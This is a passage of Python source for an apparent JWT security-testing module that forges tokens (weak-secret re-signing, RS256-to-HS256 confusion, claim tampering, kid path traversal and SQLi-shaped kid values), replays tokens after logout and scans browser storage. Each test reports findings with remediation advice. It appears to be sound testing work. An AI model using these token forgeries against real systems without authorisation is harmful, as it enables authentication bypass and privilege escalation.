                    "signature -- no validly-signed forged token available to isolate claim enforcement "
                    "from signature verification"
                )
            return (lambda claim, value: forge_role_claim_token_signed(token, claim, value, secret)), "weak HMAC secret"

        if alg in ("RS256", "RS384", "RS512"):
            jwks_endpoint = find_jwks_endpoint(endpoints)
            if jwks_endpoint is None:
                return None, "no JWKS-shaped endpoint discovered -- no validly-signed forged token available for this RS256 token"
            probed = await self._probe_get(context, jwks_endpoint.url)
            if probed is None or probed[0] != 200:
                return None, f"could not fetch a usable JWKS from '{jwks_endpoint.url}'"
            hmac_key = jwks_hmac_secret(probed[1])
            if hmac_key is None:
                return None, f"JWKS response from '{jwks_endpoint.url}' had no usable RSA key material"
            return (lambda claim, value: forge_algorithm_confusion_token(token, claim, value, hmac_key)), "RS256->HS256 algorithm confusion"

        return None, f"token alg '{alg or '?'}' has neither a recoverable HMAC secret nor asymmetric-confusion surface"

    async def _technique_claim_validation(self, role, target_endpoint, endpoints, session_manager, session_pool, evidence) -> TestCaseResult:
        technique = "Tamper a single standard claim (exp/nbf/iat/iss/aud) in an otherwise validly-signed token"
        vuln_type = "JWT Claim Validation Bypass"
        session, context, token, skip_reason = await self._prepare_role(role, target_endpoint, session_manager, session_pool)
        if skip_reason:
            return self._result("TC-057.5", technique, vuln_type, SKIPPED, skip_reason, role=role)

        forger, method_label = await self._recover_signing_forger(context, token, target_endpoint, endpoints)
        if forger is None:
            return self._result("TC-057.5", technique, vuln_type, SKIPPED, method_label, role=role)

        payload = decode_jwt_payload(token) or {}
        tested_claims: list[str] = []
        for claim, value, reason in _claim_validation_cases(int(time.time())):
            if _get_claim(payload, claim) is None:
                continue
            forged = forger(claim, value)
            if forged is None:
                continue
            tested_claims.append(claim)
            status, body = await _probe(context, target_endpoint.url, forged)
            if status == 200 and len(body) >= self.config.min_content_length:
                finding = Finding(
                    module_id=self.module_id, vuln_type=vuln_type, severity="High", cvss_score=7.5,
                    endpoint=target_endpoint, user_role=role,
                    request_raw=f"GET {target_endpoint.url}\nAuthorization: Bearer {forged}",
                    response_raw=f"HTTP {status}, {len(body)} bytes",
                    description=(
                        f"'{target_endpoint.url}' accepted a token re-signed with a recovered signing "
                        f"capability ({method_label}) carrying {reason}, for role '{role}'. The signature "
                        "was valid, so this proves the server does not enforce the "
                        f"'{claim}' claim's own semantics (RFC 7519 §4.1), not merely that it skips "
                        "signature verification."
                    ),
                    recommendation=(
                        f"Enforce standard claim semantics ('{claim}' per RFC 7519) server-side on every "
                        "request, in addition to signature verification -- a valid signature only proves "
                        "who issued a token, not that it is still within its validity window or scoped to "
                        "this service."
                    ),
                )
                finding.evidence_refs = await self._capture_evidence(evidence, context, session, target_endpoint.url, forged, label=f"jwt-claim-{claim}-{role}", finding=finding)
                return self._result("TC-057.5", technique, vuln_type, FAIL, finding.description, role=role, endpoint=target_endpoint, finding=finding)

        if not tested_claims:
            return self._result("TC-057.5", technique, vuln_type, SKIPPED, "none of exp/nbf/iat/iss/aud are present in this token's payload", role=role)
        return self._result(
            "TC-057.5", technique, vuln_type, PASS,
            f"a validly-signed token ({method_label}) with each of {tested_claims} individually tampered was rejected",
            role=role, endpoint=target_endpoint,
        )

    async def _technique_replay_after_logout(self, role, target_endpoint, session_manager, session_pool, evidence) -> TestCaseResult:
        technique = "Replay a captured token against the target endpoint after triggering logout"
        vuln_type = "JWT Replay After Logout"
        session, context, token, skip_reason = await self._prepare_role(role, target_endpoint, session_manager, session_pool)
        if skip_reason:
            return self._result("TC-057.6", technique, vuln_type, SKIPPED, skip_reason, role=role)

        if not self.config.logout_url:
            return self._result(
                "TC-057.6", technique, vuln_type, SKIPPED,
                "no JWT logout endpoint configured (JwtTestConfig.logout_url) -- this codebase has no "
                "generic JWT revocation mechanism to auto-discover (unlike cookie-session logout, a bearer "
                "token has no session cookie a DOM 'logout' click would clear), so this technique needs an "
                "explicit endpoint rather than guessing one",
                role=role,
            )

        page = await context.new_page()
        try:
            await page.goto(self.config.logout_url, timeout=10000)
        except Exception as exc:
            return self._result("TC-057.6", technique, vuln_type, SKIPPED, f"logout navigation to '{self.config.logout_url}' failed: {exc}", role=role)
        finally:
            await page.close()
            session_manager.invalidate(role)

        status, body = await _probe(context, target_endpoint.url, token)
        if status != 200 or len(body) < self.config.min_content_length:
            return self._result(
                "TC-057.6", technique, vuln_type, PASS,
                f"replaying the pre-logout token against '{target_endpoint.url}' after logout returned HTTP {status} -- token was correctly invalidated",
                role=role, endpoint=target_endpoint,
            )

        finding = Finding(
            module_id=self.module_id, vuln_type=vuln_type, severity="High", cvss_score=7.5,
            endpoint=target_endpoint, user_role=role,
            request_raw=f"GET {target_endpoint.url} using the token captured before logout for role '{role}'",
            response_raw=f"HTTP {status}, {len(body)} bytes (post-logout replay)",
            description=(
                f"The JWT captured for role '{role}' before triggering logout at "
                f"'{self.config.logout_url}' still authenticates against '{target_endpoint.url}' afterward "
                f"(HTTP {status}), meaning the server does not revoke/blacklist the token server-side on "
                "logout -- a stateless JWT that was merely discarded client-side remains fully valid until "
                "its own 'exp' claim expires."
            ),
            recommendation=(
                "Maintain a server-side revocation list (or short-lived tokens plus a refresh-token "
                "revocation check) so a token is rejected immediately after logout, not just once its "
                "own expiry claim is reached."
            ),
        )
        finding.evidence_refs = await self._capture_evidence(evidence, context, session, target_endpoint.url, token, label=f"jwt-replay-after-logout-{role}", finding=finding)
        return self._result("TC-057.6", technique, vuln_type, FAIL, finding.description, role=role, endpoint=target_endpoint, finding=finding)

    async def _check_storage_for_jwt(self, context, target_endpoint) -> str | None:
        """Best-effort, read-only check of a live page's localStorage/
        sessionStorage for a JWT-shaped value. Never writes anything.
        Returns None (not an error) if no page could be opened/
        navigated -- a real, common outcome for a target this session
        pool can't reach right now, not proof storage is clean."""
        try:
            page = await context.new_page()
        except Exception as exc:
            _log.warning(f"could not open a page to inspect browser storage: {exc}")
            return None
        try:
            await page.goto(target_endpoint.url, timeout=10000)
            storage = await page.evaluate(
                """() => {
                    const out = {};
                    try { for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); out['localStorage:' + k] = localStorage.getItem(k); } } catch (e) {}
                    try { for (let i = 0; i < sessionStorage.length; i++) { const k = sessionStorage.key(i); out['sessionStorage:' + k] = sessionStorage.getItem(k); } } catch (e) {}
                    return out;
                }"""
            )
        except Exception as exc:
            _log.warning(f"could not read browser storage on '{target_endpoint.url}': {exc}")
            return None
        finally:
            await page.close()
        if not isinstance(storage, dict):
            return None
        for key, value in storage.items():
            if isinstance(value, str) and find_jwt_in_text(value):
                return key
        return None

    async def _technique_jwt_exposure(self, role, target_endpoint, endpoints, session_manager, session_pool, evidence) -> TestCaseResult:
        technique = "Scan discovered endpoint URLs and page localStorage/sessionStorage for an exposed JWT"
        vuln_type = "JWT Exposure"
        session, context, token, skip_reason = await self._prepare_role(role, target_endpoint, session_manager, session_pool)
        if skip_reason:
            return self._result("TC-057.7", technique, vuln_type, SKIPPED, skip_reason, role=role)

        exposed_url = next((e.url for e in endpoints if find_jwt_in_text(e.url)), None)
        exposed_storage_key = await self._check_storage_for_jwt(context, target_endpoint)

        if exposed_url is None and exposed_storage_key is None:
            return self._result(
                "TC-057.7", technique, vuln_type, PASS,
                f"no JWT-shaped token found in {len(endpoints)} discovered endpoint URLs or in page localStorage/sessionStorage",
                role=role, endpoint=target_endpoint,
            )

        where = f"URL '{exposed_url}'" if exposed_url else f"browser storage key '{exposed_storage_key}'"
        finding = Finding(
            module_id=self.module_id, vuln_type=vuln_type, severity="Medium", cvss_score=5.3,
            endpoint=target_endpoint, user_role=role,
            request_raw=f"passive scan of discovered endpoints and page storage for role '{role}'",
            response_raw=f"JWT-shaped token found in {where}",
            description=(
                f"A JWT-shaped token was found exposed in {where}. Tokens in URLs are logged by proxies, "
                "web servers, and browser history; tokens in localStorage/sessionStorage are readable by "
                "any JavaScript running on the page, including via XSS -- both are common, well-documented "
                "real-world JWT exposure vectors distinct from any signature/claim weakness in the token "
                "itself."
            ),
            recommendation=(
                "Never place a JWT in a URL (query string or path); prefer an HttpOnly, Secure cookie or "
                "an in-memory-only token over localStorage/sessionStorage, which is fully readable by any "
                "script on the page."
            ),
        )
        finding.evidence_refs = await self._capture_evidence(evidence, context, session, target_endpoint.url, token, label=f"jwt-exposure-{role}", finding=finding)
        return self._result("TC-057.7", technique, vuln_type, FAIL, finding.description, role=role, endpoint=target_endpoint, finding=finding)

    async def _technique_kid_header_injection(self, role, target_endpoint, session_manager, session_pool, evidence) -> TestCaseResult:
        technique = "Inject the JWT header's 'kid' claim: path traversal to a known-empty file, or a SQLi-shaped value checked for a DB-error fingerprint"
        vuln_type = "JWT kid Header Injection"
        session, context, token, skip_reason = await self._prepare_role(role, target_endpoint, session_manager, session_pool)
        if skip_reason:
            return self._result("TC-057.8", technique, vuln_type, SKIPPED, skip_reason, role=role)

        # (a) path traversal -- forges the token as HS256 regardless of
        # the original alg, per PortSwigger's own documented shape: a
        # server whose key-lookup code dynamically trusts a
        # client-supplied `kid` enough to read a file with it is exactly
        # the kind of server likely to also dynamically trust a
        # client-supplied `alg`. Skips this half (not the whole
        # technique) if `role_claim` isn't present -- the SQLi half
        # below still runs regardless.
        path_traversal_tried = False
        for kid_path in _KID_PATH_TRAVERSAL_CANDIDATES:
            forged = forge_kid_path_traversal_token(token, self.config.role_claim, self.config.elevated_value, kid_path)
            if forged is None:
                continue
            path_traversal_tried = True
            status, body = await _probe(context, target_endpoint.url, forged)
            if status == 200 and len(body) >= self.config.min_content_length:
                finding = Finding(
                    module_id=self.module_id, vuln_type=vuln_type, severity="Critical", cvss_score=9.1,
                    endpoint=target_endpoint, user_role=role,
                    request_raw=f"GET {target_endpoint.url}\nAuthorization: Bearer {forged}",
                    response_raw=f"HTTP {status}, {len(body)} bytes",
                    description=(
                        f"'{target_endpoint.url}' accepted a JWT whose header 'kid' claim was set to "
                        f"'{kid_path}' (a relative path traversal to a predictable, effectively-empty "
                        "file) and re-signed as HS256 using that file's presumed-empty content as the "
                        f"HMAC secret, with '{self.config.role_claim}' changed to "
                        f"'{self.config.elevated_value}', for role '{role}'. This indicates the server's "
                        "key-lookup logic passes the client-controlled 'kid' header into a filesystem "
                        "read without validating it stays within an expected key directory, letting an "
                        "attacker force signature verification against an attacker-known key."
                    ),
                    recommendation=(
                        "Never resolve a signing/verification key from a client-supplied 'kid' value "
                        "directly -- validate it against a server-side allow-list of known key "
                        "identifiers (or an internal key-ID-to-key mapping), never build a filesystem or "
                        "URL path from it."
                    ),
                )
                finding.evidence_refs = await self._capture_evidence(evidence, context, session, target_endpoint.url, forged, label=f"jwt-kid-path-traversal-{role}", finding=finding)
                return self._result("TC-057.8", technique, vuln_type, FAIL, finding.description, role=role, endpoint=target_endpoint, finding=finding)

        # (b) SQLi-shaped kid value -- pure error-fingerprint detection,
        # identical evidence bar to every other SQLi-shaped technique in
        # this codebase (never claims exploitation, only that 'kid'
        # flows unsanitized into a query); read-only, so no
        # allow_state_changing_probes gate, matching TC-057.6's own
        # ungated precedent for a non-destructive probe.
        for kid_value in _KID_SQLI_PROBE_VALUES:
            forged = forge_kid_injection_token(token, kid_value)
            if forged is None:
                continue
            status, body = await _probe(context, target_endpoint.url, forged)
            fingerprint = looks_like_sql_error(body)
            if fingerprint:
                finding = Finding(
                    module_id=self.module_id, vuln_type=vuln_type, severity="High", cvss_score=7.5,
                    endpoint=target_endpoint, user_role=role,
                    request_raw=f"GET {target_endpoint.url}\nAuthorization: Bearer {forged}",
                    response_raw=f"HTTP {status}, DB-error fingerprint '{fingerprint}' in a {len(body)}-byte body",
                    description=(
                        f"'{target_endpoint.url}' returned a database-error fingerprint "
                        f"('{fingerprint}') when the JWT header 'kid' claim was set to the "
                        f"syntax-breaking value '{kid_value}', for role '{role}'. This indicates 'kid' "
                        "flows unsanitized into a database query during key lookup -- a SQL injection "
                        "point distinct from any signature weakness in the token itself, and "
                        "(depending on the query's shape) a possible route to bypassing signature "
                        "verification outright."
                    ),
                    recommendation=(
                        "Treat the 'kid' header exactly like any other untrusted client input -- "
                        "parameterize any query that looks it up, and validate it against a server-side "
                        "allow-list of known key identifiers before it ever reaches a query or "
                        "filesystem/URL path."
                    ),
                )
                finding.evidence_refs = await self._capture_evidence(evidence, context, session, target_endpoint.url, forged, label=f"jwt-kid-sqli-{role}", finding=finding)
                return self._result("TC-057.8", technique, vuln_type, FAIL, finding.description, role=role, endpoint=target_endpoint, finding=finding)

        if path_traversal_tried:
            detail = (
                f"{len(_KID_PATH_TRAVERSAL_CANDIDATES)} path-traversal 'kid' candidates were rejected and "
                f"{len(_KID_SQLI_PROBE_VALUES)} SQLi-shaped 'kid' values produced no DB-error fingerprint"
            )
        else:
            detail = (
                f"'{self.config.role_claim}' claim not present -- path-traversal variant skipped; "
                f"{len(_KID_SQLI_PROBE_VALUES)} SQLi-shaped 'kid' values produced no DB-error fingerprint"
            )
        return self._result("TC-057.8", technique, vuln_type, PASS, detail, role=role, endpoint=target_endpoint)

    async def run_techniques(
        self,
        endpoints: list["Endpoint"],
        session_manager: "SessionManager",
        session_pool: "SessionPool",
        evidence: "EvidenceCollector | None" = None,
    ) -> list[TestCaseResult]:
        candidates = [e for e in endpoints if e.auth_required and e.method.upper() == "GET"]
        target_endpoint = next((e for e in candidates if e.endpoint_type == "api"), None) or next(iter(candidates), None)

        techniques = (
            ("TC-057.1", "Edit role claim, keep the original mismatched signature", "JWT Role Manipulation", self._technique_mismatched_sig),
            ("TC-057.2", "Edit role claim and switch alg to none", "JWT Role Manipulation via alg:none", self._technique_alg_none),
            ("TC-057.3", "Edit role claim after brute-forcing a weak HMAC secret", "JWT Role Manipulation via weak HMAC secret", self._technique_weak_secret),
            ("TC-057.4", "Sign a role-tampered token as HS256 using the server's own RS256 public key",
             "JWT Role Manipulation via Algorithm Confusion (RS256->HS256)", self._technique_algorithm_confusion),
            ("TC-057.5", "Tamper a single standard claim (exp/nbf/iat/iss/aud) in an otherwise validly-signed token",
             "JWT Claim Validation Bypass", self._technique_claim_validation),
            ("TC-057.6", "Replay a captured token against the target endpoint after triggering logout",
             "JWT Replay After Logout", self._technique_replay_after_logout),
            ("TC-057.7", "Scan discovered endpoint URLs and page localStorage/sessionStorage for an exposed JWT",
             "JWT Exposure", self._technique_jwt_exposure),
            ("TC-057.8", "Inject the JWT header's 'kid' claim: path traversal to a known-empty file, or a SQLi-shaped value checked for a DB-error fingerprint",
             "JWT kid Header Injection", self._technique_kid_header_injection),
        )

        if target_endpoint is None:
            return [
                self._result(tid, technique, vuln_type, SKIPPED, "no auth-required GET endpoint discovered to probe", role=role)
                for role in self.roles for tid, technique, vuln_type, _ in techniques
            ]

        _needs_endpoints = {"TC-057.4", "TC-057.5", "TC-057.7"}
        results: list[TestCaseResult] = []
        for role in self.roles:
            for tid, _technique, _vuln_type, method in techniques:
                if tid in _needs_endpoints:
                    results.append(await method(role, target_endpoint, endpoints, session_manager, session_pool, evidence))
                else:
                    results.append(await method(role, target_endpoint, session_manager, session_pool, evidence))
        return results
